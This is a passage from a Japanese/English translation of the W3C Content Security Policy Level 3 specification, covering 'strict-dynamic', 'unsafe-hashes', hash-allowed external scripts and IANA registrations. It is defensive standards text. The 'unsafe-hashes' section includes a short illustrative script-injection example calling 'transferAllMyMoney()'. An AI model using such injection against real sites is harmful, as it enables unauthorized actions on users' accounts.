The first change allows you to deploy "'strict-dynamic' in a backwards compatible way, without requiring user-agent sniffing: the policy 'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic' will act like 'unsafe-inline' https: in browsers that support CSP1, https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' in browsers that support CSP2, and 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic' in browsers that support CSP3.
<!-- ＊abcdefg？ -->
</div>

<p>
(B) は、［
~nonce／~hash
］を介して~pageへの~accessが与えられた~scriptが、~pageの施策に明示的に追加することなく，他との依存関係を持ち込めるようにする。
◎
The second allows scripts which are given access to the page via nonces or hashes to bring in their dependencies without adding them explicitly to the page’s policy.
</p>

<div class="example">
<p>
MegaCorp 社は、次の施策を配備していて：
◎
Suppose MegaCorp, Inc. deploys the following policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' `strict-dynamic$pl
</pre>

<p>
作動中の施策を伴う，次の~HTMLを~serveしているとする：
◎
And serves the following HTML with that policy active:
</p>

<pre class="html-code">
...
&lt;script
    src="https://cdn.example.com/script.js"
    nonce="DhcnhD3khTMePgXwdayK9BsMqXjhguVV"
&gt;&lt;/script&gt;
...
</pre>

<p>
これは
`https://cdn.example.com/script.js^s
に対する要請を生成することになり、それは `nonce$a 属性に合致するので阻止されないことになる。
◎
This will generate a request for https://cdn.example.com/script.js, which will not be blocked because of the matching nonce attribute.
</p>

<p>
`script.js^s が次の~codeを包含するならば：
◎
If script.js contains the following code:
</p>

<pre>
var %s = document.createElement('script');
%s.src = 'https://othercdn.not-example.net/dependency.js';
document.head.appendChild(%s);

document.write('&lt;scr' + 'ipt src="/sadness.js"&gt;&lt;/scr' + 'ipt&gt;');
</pre>

<p>
`dependency.js^s
は読込まれることになる
— `createElement()^c により作成される `script$e 要素は、`構文解析-時に挿入され$るものではないので。
◎
dependency.js will load, as the script element created by createElement() is not "parser-inserted".
</p>

<p>
一方で、 `sadness.js^s は<em>読込まれない</em>
— `document.write()^c は，`構文解析-時に挿入され$る `script$e 要素を生産するので。
◎
sadness.js will not load, however, as document.write() produces script elements which are "parser-inserted".
</p>

</div>

		</section>
		<section id="unsafe-hashes-usage">
<h3 title="Usage of &quot;'unsafe-hashes'&quot;">8.3. `unsafe-hashes^pl の用法</h3>

~INFORMATIVE

<p>
［
旧来の~website ／ 旧来の依存関係を伴う~website
］では、~event~handlerをまるごと外部化するのが困難なこともある。
これらの~siteは、その種の~handlerを `unsafe-inline^pl で許容して可能化することもできるが、それは，多数の~riskを抱える諸刃の剣である（また、~nonceや~hashと共には利用できない）。
◎
Legacy websites and websites with legacy dependencies might find it difficult to entirely externalize event handlers. These sites could enable such handlers by allowing 'unsafe-inline', but that’s a big hammer with a lot of associated risk (and cannot be used in conjunction with nonces or hashes).
</p>

<p>
~source式 `unsafe-hashes$pl は、そのような状況~下で，［
~hashを介して特定の~handlerを可能化できる
］ようにすることで、開発者が，~CSPをより単純かつ安全に配備できるようにすることを目指している。
◎
The "'unsafe-hashes'" source expression aims to make CSP deployment simpler and safer in these situations by allowing developers to enable specific handlers via hashes.
</p>

<div class="example">
<p>
MegaCorp 社は、次の~HTMLを適度な~scheduleで取り去れないので：
◎
MegaCorp, Inc. can’t quite get rid of the following HTML on anything resembling a reasonable schedule:
</p>


<pre class="html-code">
&lt;button id="action" onclick="doSubmit()"&gt;
</pre>

<p>
`unsafe-inline^pl を指定して保安を抑制するのでなく，［
~hash~source式と `unsafe-hashes^pl
］を利用することに決めた：
◎
Rather than reducing security by specifying "'unsafe-inline'", they decide to use "'unsafe-hashes'" along with a hash source expression, as follows:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    script-src `unsafe-hashes$pl
    'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='
</pre>

</div>

<p>
`unsafe-hashes$pl
が供する能力は、旧来の~siteにとって有用になるが、現代の~siteにおいては避けるべきである。
特に，~hashは、特定0の~scriptを実行するのを許容するが，開発者が意図する仕方で実行することは確保しないことに注意。
興味を引く能力が~inline~event~handlerとして公開された場合（例えば
`&lt;a onclick="transferAllMyMoney()"&gt;Transfer&lt;/a&gt;^s
とする）、その~scriptは，攻撃者にとっては
`&lt;script&gt;transferAllMyMoney()&lt;/script&gt;^s
としての注入-用に可用になる。
開発者は、~inline~event~handlerを許容して得られる配備上の利点は，同時に特定の~scriptを実行するのを許容する~riskにもなることに注意深くなるべきである。
◎
The capabilities 'unsafe-hashes' provides is useful for legacy sites, but should be avoided for modern sites. In particular, note that hashes allow a particular script to execute, but do not ensure that it executes in the way a developer intends. If an interesting capability is exposed as an inline event handler (say &lt;a onclick="transferAllMyMoney()"&gt;Transfer&lt;/a&gt;), then that script becomes available for an attacker to inject as &lt;script&gt;transferAllMyMoney()&lt;/script&gt;. Developers should be careful to balance the risk of allowing specific scripts to execute against the deployment advantages that allowing inline event handlers might provide.
</p>

		</section>
		<section id="external-hash">
<h3 title="Allowing external JavaScript via hashes">8.4. ~hashを介して外部~JSを許容する</h3>

<p>
`CSP2$r では、~hash`~source式$が合致し得るのは，~inline~scriptに限られていたが、今や Subresource Integrity `SRI$r が広範に配備されたので，外部化された~JSも可能化するように視野を拡げれる。
◎
In [CSP2], hash source expressions could only match inlined script, but now that Subresource Integrity is widely deployed, we can expand the scope to enable externalized JavaScript as well.
</p>

<p>
ある `script$e に対し，複数の完全性~metadataからなる集合が指定された場合、［
要請が施策の `hash-source$p たちに合致する
］ための必要十分条件は，［
`script$e の完全性~metadata内の <em>各</em> ~itemが当の施策に合致する
］ときになる。
◎
If multiple sets of integrity metadata are specified for a script, the request will match a policy’s hash-sources if and only if each item in a script's integrity metadata matches the policy.
</p>

<div class="example">
<p >
MegaCorp 社は，内容が期待に合致することを確保するため、~page上の 2 個の特定の~scriptを許容したいとする
— 次の施策を設定したとするとき：
◎
MegaCorp, Inc. wishes to allow two specific scripts on a page in a way that ensures that the content matches their expectations. They do so by setting the following policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    script-src 'sha256-abc123' 'sha512-321cba'
</pre>

<p>
この施策が在する下では、次の各 `script$e 要素の実行は 許容されることになる
— いずれも，施策に合致する完全性~metadataのみを包含するので：
◎
In the presence of that policy, the following script elements would be allowed to execute because they contain only integrity metadata that matches the policy:
</p>

<pre class="html-code">
&lt;script integrity="sha256-abc123" ...&gt;&lt;/script&gt;
&lt;script integrity="sha512-321cba" ...&gt;&lt;/script&gt;
&lt;script integrity="sha256-abc123 sha512-321cba" ...&gt;&lt;/script&gt;
</pre>

<p>
一方で，次の各 `script$e 要素は，妥当な~metadataを包含するが施策に合致しないので、いずれも（他の~metadataは合致していても）実行されない：
◎
While the following script elements would not execute because they contain valid metadata that does not match the policy (even though other metadata does match):
</p>

<pre class="html-code">
&lt;script integrity="<mark>sha384-xyz789</mark>" ...&gt;&lt;/script&gt;
&lt;script integrity="<mark>sha384-xyz789</mark> sha512-321cba" ...&gt;&lt;/script&gt;
&lt;script integrity="sha256-abc123 <mark>sha384-xyz789</mark> sha512-321cba" ...&gt;&lt;/script&gt;
</pre>

<p>
認識されない（妥当でないか 未~supportの~hash用~algoを指定している）~metadataは、ここに述べた挙動には影響しない。
すなわち，上の施策が在する下では、次の各 `script$e 要素は，実行-が許容されることになる
— 追加の~metadataは妥当でないので：
<!-- ＊？and therefore wouldn’t allow a script whose content wasn’t listed explicitly in the policy to execute -->
◎
Metadata that is not recognized (either because it’s entirely invalid, or because it specifies a not-yet-supported hashing algorithm) does not affect the behavior described here. That is, the following elements would be allowed to execute in the presence of the above policy, as the additional metadata is invalid and therefore wouldn’t allow a script whose content wasn’t listed explicitly in the policy to execute:
</p>

<pre class="html-code">
&lt;script integrity="sha256-abc123 sha1024-abcd" ...&gt;&lt;/script&gt;
&lt;script integrity="sha512-321cba <mark>entirely-invalid</mark>" ...&gt;&lt;/script&gt;
&lt;script integrity="sha256-abc123 <mark>not-a-hash-at-all sha512-321cba</mark>" ...&gt;&lt;/script&gt;
</pre>

</div>

		</section>
	</section>
	<section id="implementation-considerations">
<h2 title="Implementation Considerations">9. 実装にあたっての考慮点</h2>



		<section id="extensions">
<h3 title="Vendor-specific Extensions and Addons">9.1. ~vendor特有の拡張／~addon</h3>

<p>
資源~上に施行される`施策$は、［
~addon, 拡張, ~bookmarklet
］などの，~UA特色機能の運用には、干渉する~SHOULDでない。
`HTML-DESIGN$r にて信奉されているように、この種の特色機能は，一般に~page作者より利用者に優先権を与えるものなので。
◎
Policy enforced on a resource SHOULD NOT interfere with the operation of user-agent features like addons, extensions, or bookmarklets. These kinds of features generally advance the user’s priority over page authors, as espoused in [HTML-DESIGN].
</p>

<p>
更には、この種の特色機能に~CSPを適用すると，その違反~報告において相当量の~noise~~源になり、結果として，~web開発者にとっての価値は損われることになる。
◎
Moreover, applying CSP to these kinds of features produces a substantial amount of noise in violation reports, significantly reducing their value to developers.
</p>

<p>
例えば Chromeでは， `chrome-extension_^sc ~schemeを~CSP検査から除外しており、~pageの施策に関わらず，拡張により駆動される注入は許容するような 何らかの仕事を行っている。
◎
Chrome, for example, excludes the chrome-extension: scheme from CSP checks, and does some work to ensure that extension-driven injections are allowed, regardless of a page’s policy.
</p>

		</section>
	</section>
	<section id="iana-considerations">
<h2 title="IANA Considerations">10. IANA 考慮点</h2>

		<section id="iana-registry">
<h3 title="Directive Registry">10.1. 指令の登記簿</h3>

<p>
Content Security Policy Directive
（~CSP 指令）登記簿は、次の登録と参照により更新されるべきである
`RFC7762$r
【 “参照” の欄は、各~指令のリンク先と同じなので省略する】
：
◎
The Content Security Policy Directive registry should be updated with the following directives and references [RFC7762]:
</p>

<div >
<ul ><li>`base-uri$dir
</li><li>`child-src$dir
</li><li>`connect-src$dir
</li><li>`default-src$dir
</li><li>`disown-opener$dir
</li><li>`font-src$dir
</li><li>`form-action$dir
</li><li>`frame-ancestors$dir
</li><li>`frame-src$dir
</li><li>`img-src$dir
</li><li>`manifest-src$dir
</li><li>`media-src$dir
</li><li>`object-src$dir
</li><li>`plugin-types$dir
</li><li>`report-uri$dir
</li><li>`report-to$dir
</li><li>`sandbox$dir
</li><li>`script-src$dir
</li><li>`style-src$dir
</li><li>`worker-src$dir
</li></ul>

◎
base-uri
• This document (see §6.2.1 base-uri)
child-src
• This document (see §6.1.1 child-src)
connect-src
• This document (see §6.1.2 connect-src)
default-src
• This document (see §6.1.3 default-src)
disown-opener
• This document (see §6.2.4 disown-opener)
font-src
• This document (see §6.1.4 font-src)
form-action
• This document (see §6.3.1 form-action)
frame-ancestors
• This document (see §6.3.2 frame-ancestors)
frame-src
• This document (see §6.1.5 frame-src)
img-src
• This document (see §6.1.6 img-src)
manifest-src
• This document (see §6.1.7 manifest-src)
media-src
• This document (see §6.1.8 media-src)
object-src
• This document (see §6.1.10 object-src)
plugin-types
• This document (see §6.2.2 plugin-types)
report-uri
• This document (see §6.4.1 report-uri)
report-to
• This document (see §6.4.2 report-to)
sandbox
• This document (see §6.2.3 sandbox)
script-src
• This document (see §6.1.11 script-src)
style-src
• This document (see §6.1.12 style-src)
worker-src
• This document (see §6.1.13 worker-src)
</div>

		</section>
		<section id="iana-headers">
<h3 title="Headers">10.2. ~header登録</h3>

<p>
恒久的~message~header登記簿は、次の登録により更新されるべきである：
`RFC3864$r
◎
The permanent message header field registry should be updated with the following registrations: [RFC3864]
</p>


<div>
<table><tbody><tr><th rowspan="2">~header名
<td id="iana-csp">`Content-Security-Policy$h
<tr><td id="iana-cspro">`Content-Security-Policy-Report-Only$h

<tr><th>適用-可能な~protocol
<td>http

<tr><th>位置付け
<td>standard

<tr><th>~~作成／~~変更 ~~管理者
<td>W3C

<tr><th>仕様~文書
<td>この仕様

</tbody></table>

◎
Content-Security-Policy
◎
Header field name
• Content-Security-Policy 
Applicable protocol
• http 
Status
• standard 
Author/Change controller
• W3C 
Specification document
• This specification (See §3.1 The Content-Security-Policy HTTP Response Header Field) 

◎
Content-Security-Policy-Report-Only
◎
Header field name
• Content-Security-Policy-Report-Only 
Applicable protocol
• http 
Status
• standard 
Author/Change controller
• W3C 
Specification document
• This specification (See §3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field)
</div>



		</section>
	</section>
	<section id="acknowledgements">
<h2 title="Acknowledgements">11. 謝辞</h2>

<p>
~~協力された多数の方々に。
具体的には：
◎
Lots of people are awesome. For instance:
</p>

<ul lang="en-x-a0">
	<li>
Mario and all of Cure53.
</li>
	<li>
Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, Jochen Eisinger, and the
rest of Google’s CSP Cabal.
</li>
</ul>

	</section>
</main></div><!-- MAIN -->

